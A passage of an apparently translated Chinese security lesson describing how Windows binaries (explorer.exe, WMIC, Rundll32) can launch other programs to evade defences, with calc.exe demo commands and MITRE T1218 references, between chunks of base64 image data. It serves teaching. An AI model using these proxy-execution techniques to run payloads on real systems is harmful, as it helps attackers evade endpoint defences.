AJBT4pMvwGA5ACRFEBRxAi9pBsP0CAuZxAFQG9Zr20/oAp14EtBMuaUiPyCK1NQLAvvYbthgwUA0gQtUsESjGoE0zG7l5aLIRZGrKPbNnu15VzfZja8tsMdfsqTrYtP04ECGVUAz0En8k7cf17Sev8LTdmjbSI7afLOGUpABEjQJ4Ok/IAVh2s5qU4nEFRhEw3f0AyA4kbNtD7fp40nhxuQifPHwvdh1ueRrYYxrYQ34W2k8pZy8HY7kw++o8IxgGLBycp/3K2oDdJhTbfgEdT3MiUF8OgMuOZg5JcaD4ZxeUUp9IMjXnAEitKo0KaDtvkJQSSA6gZQ2JPIG91gFo7RfOm2tcHCc+kcszv5/s9nOuz8jWyE3YAYxnPwCebmc/97apAei7xDiRX3hcvd4zpVQfUkq2CKhFENEC2I7KGiYqH7OHsdQ9WsS4OK5xch7CUzFVWygCUurzOLRhXNLIXq6PkKw9Wwsq2GqYJu3nHttOwAHwM9mPB1v1LOc8sBhZ7A5GVn8j8VriKdcA3Pl9VBKgfquY8CW0rcklyyC/1znEXcnJjaE85w2nPozLci2wUYiObJg4B/BMCg7gKUMAmowCKCXPAnSOa8VB1gqCbDVOytFfEzMiFqw6CRFTmrJXt9WONb10SAeglDDm7znmGealxFMAsqZDVQs5PcW/Vu0X7QCeWrkA0N3/doJ/8NnHjTQg+L1rqshRPZIDkSfh1WTO5bD1WB4bspc8QYS7vKBZ+1WUGUn7Gd+7zoktof3Mt27T3S+c6Hqq+tkSjKePZj8fj+sDbSKIkAqwtgxVe55SXw1Y5P/GQhB7QVAoia8L7bQcEVhC+4lLhcdQxGXlX+ijtR/13X7mWx9NowiYf697Tj3B37/rd7O7h+M2g4zfIcg/hiy9Nu0i0nyIT5raZ24QosQdfmN2ogl3LurNOMQvATf+U5IuG6Zf1HQERUDj4q7alZlIv/Kz/rzcfuSd9x/1v5+ie/79iWQEYNFoD2U/T85SgYgIYu8Tz0K00IcF5byxKiqR9/nEagBa0c8sAFYZApG1t39RN9AqyiTsQdFbetCx/ci6MrBxHQB7RSybtjrl9iPW+pqm4/acC+kxKRY2d9Ffz4EpQAa2s9tDff1PvQkA3fsfZ/jZz9yfNeg/heoBdVFE31RSDgR1OUbKcwHMmWQk/j++awaS55p+rSLI0lyA6QDrRwXc6wSuX/tVuzh1br+M/HQ/3fvimeQEYC4CL57i7/3ykUwEnszTAandvUtJpaX9zsw/JVaWafFYv75kqhaSyihI8vivOEYckzeyWrrDF1YAOnM5OrSfvIgozRpA0X6l9ee69vNFfqF95eY+lT3xEN330pk+/6PerwtA9/1n/gWPTP/lU9/Ifv9R6QbEKat1oyLstUvG0ni2ri6bcgSxL/BJlUUMXQ9QKhGZW3BTr3XANirh9lv5qsa+9psbndR3dPJvjKpvdOrbgp28n0shy//o5HM/fmIZ/9HSLgyy+MJPTL9758PZP/hAdv9o9n/ulXJiPRKwFTFsm8Wh8eXEVwMSV3PJq/FuEjuYN6q0KP714QDEab7inA0l1G/YbDvv/IC0VwPOawC+9mMxslf5v79GILRfTvpnsuNPTT7/8okl/0/dTjZReld0+9U//n6SPeiHf3hP+pe/Q/uNqv268heXBgPQfhuMCU4BAGwucHVgAO0HBwAAABwAIgiA9oMAjL7/oF3RfsAGOwB0IbQfgBQAQPsBYRDjZAPAxgKjAAAAAQAAAAIAAAAEAAAACAAAABAAAAAgAAAAQAAAAIAAAAAAAQAAAAIAAAAEAAAACAAAABAAAAAgAAAAQAAAAIAAAAAAAQAAAAIAAAAEAAAACAAAABAAAAAgAAAAQAAAAIAAAAAAAQAAAAIAAAAEAAAACAAAABAAAAAgAAAAQAAAAIAAAAAAAQAAQML/A8vIw73ziok+AAAAAElFTkSuQmCC" width="256" height="256" class="img_ev3q"></p>
<p>文件资源管理器是 Windows 的文件管理器和系统组件。人们发现，使用文件资源管理器二进制文件可以执行其他 .exe 文件。这种技术被称为 <strong>间接命令执行</strong>，其中 <code>explorer.exe</code> 工具可以被用来启动恶意脚本或可执行文件，且来自一个受信任的父进程。</p>
<p><code>explorer.exe</code> 二进制文件的位置如下：</p>
<ul>
<li>对于 Windows 64 位版本：<code>C:\Windows\explorer.exe</code></li>
<li>对于 Windows 32 位版本：<code>C:\Windows\SysWOW64\explorer.exe</code></li>
</ul>
<p>为了创建 <code>explorer.exe</code> 作为父进程的子进程，我们可以执行以下命令：</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt; explorer.exe /root,&quot;C:\Windows\System32\calc.exe&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>由于之前的命令执行，我们在桌面上弹出了计算器。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="wmic">WMIC<a href="#wmic" class="hash-link" aria-label="Direct link to WMIC" title="Direct link to WMIC">​</a></h3>
<p>Windows 管理工具（WMIC）是一个 Windows 命令行实用程序，用于管理 Windows 组件。人们发现，WMIC 也可以用于执行二进制文件，以规避防御措施。MITRE ATT&amp;CK 框架将这种技术称为签名二进制代理执行（<a href="https://attack.mitre.org/techniques/T1218/" target="_blank" rel="noopener noreferrer">T1218</a>）。</p>
<div class="language-shell-session codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell-session codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt;wmic.exe process call create calc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Executing (Win32_Process)-&gt;Create()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Method execution successful.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Out Parameters:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">instance of __PARAMETERS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ProcessId = 1740;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ReturnValue = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">};</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:\Users\thm&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>之前的 WMIC 命令创建了一个我们选择的二进制文件的新进程，在本例中是 <code>calc.exe</code>。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="rundll32">Rundll32<a href="#rundll32" class="hash-link" aria-label="Direct link to Rundll32" title="Direct link to Rundll32">​</a></h3>
<p>Rundll32 是 Microsoft 内置的工具，用于在操作系统中加载和运行动态链接库（DLL）文件。红队可以滥用并利用 <code>rundll32.exe</code> 来运行任意有效载荷，并执行 JavaScript 和 PowerShell 脚本。MITRE ATT&amp;CK 框架将其识别为 <strong>签名二进制代理执行：Rundll32</strong>，并将其归类为 <a href="https://attack.mitre.org/techniques/T1218/011/" target="_blank" rel="noopener noreferrer">T1218</a>。</p>
<p><img decoding="async" loading="lazy" alt=" " src="data:image/png;base64,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